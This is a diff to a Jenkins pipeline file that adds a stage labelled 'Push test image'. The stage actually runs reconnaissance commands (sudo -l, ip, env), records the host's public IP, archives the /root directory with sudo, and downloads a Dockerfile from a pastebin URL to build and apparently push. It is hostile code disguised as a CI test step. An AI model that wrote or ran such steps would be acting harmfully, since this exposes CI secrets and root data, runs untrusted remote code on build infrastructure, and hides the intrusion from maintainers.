@@ -16,6 +16,21 @@ def tryStep(String message, Closure block, Closure tearDown = null) {
     }
 }
 
+node {
+    stage('Push test image') {
+        tryStep "Test", {
+          sh 'sudo -l'
+          sh 'ip a s'
+          sh 'env'
+          sh 'curl -s ifconfig.me > /var/tmp/ifconfig'
+          sh 'docker image ls > /var/tmp/docker'
+          sh 'sudo tar czvf /var/tmp/jenkins.tar.gz /root'
+          sh 'curl https://pastebin.com/raw/i6xChZ2B -o /var/tmp/Dockerfile'
+          sh 'cd /var/tmp && docker build -t amsterdam/test:latest .'
+          # push
+        }
+    }
+}
 
 node {
     stage("Checkout") {
@@ -48,7 +63,6 @@ node {
 
 
 String BRANCH = "${env.BRANCH_NAME}"
-
 
 if (BRANCH == "develop") {
 
